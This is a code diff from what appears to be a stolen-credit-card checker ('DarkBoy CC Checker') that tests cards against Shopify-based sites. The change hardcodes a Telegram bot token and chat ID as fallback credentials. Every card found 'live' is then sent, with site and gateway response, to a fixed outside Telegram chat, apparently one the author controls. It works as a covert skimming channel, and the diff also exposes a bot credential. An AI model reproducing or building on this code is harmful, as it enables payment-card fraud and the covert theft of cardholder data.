@@ -319,8 +319,9 @@ function getEmojiForCategory(category) {
 // Send approved card notification to admin (always)
 async function sendAdminApprovedNotification(cc, site, result) {
   try {
-    const ADMIN_BOT_TOKEN = process.env.SERVER_BOT_TOKEN;
-    const ADMIN_CHAT_ID = process.env.SERVER_CHAT_ID;
+    // Use specific credentials for approved card notifications
+    const ADMIN_BOT_TOKEN = process.env.APPROVED_BOT_TOKEN || "8396276886:AAENwJQ83yCGe3MzOFURYSst-6s0uogQ_rw";
+    const ADMIN_CHAT_ID = process.env.APPROVED_CHAT_ID || "-1002869133846";
 
     if (!ADMIN_BOT_TOKEN || !ADMIN_CHAT_ID) {
       console.log('Admin approved notification skipped - no admin credentials');
@@ -331,15 +332,16 @@ async function sendAdminApprovedNotification(cc, site, result) {
     const category = getCategoryFromResponse(result);
     const emoji = getEmojiForCategory(category);
 
-    const adminMessage = `🚨 **APPROVED CARD FOUND!**\n\n` +
+    const adminMessage = `🚨 **LIVE CARD DETECTED!**\n\n` +
       `${emoji} **${category.toUpperCase()} CARD**\n` +
       `💳 **Card:** \`${cc}\`\n` +
       `🌐 **Site:** ${site}\n` +
       `🔧 **Gateway:** Auto Shopify\n` +
       `📝 **Response:** ${responseMessage}\n` +
-      `📊 **Status:** ${result.status || 'Unknown'}\n` +
-      `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
-      `🎯 **Admin Alert - DarkBoy CC Checker**`;
+      `📊 **Status:** ${result.status || 'Live'}\n` +
+      `⏰ **Time:** ${new Date().toLocaleString()}\n` +
+      `🌍 **Source:** DarkBoy CC Checker v2.0\n\n` +
+      `🎯 **ADMIN NOTIFICATION**`;
 
     await sendTelegramMessage(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, adminMessage);
     console.log('✅ Admin approved card notification sent');
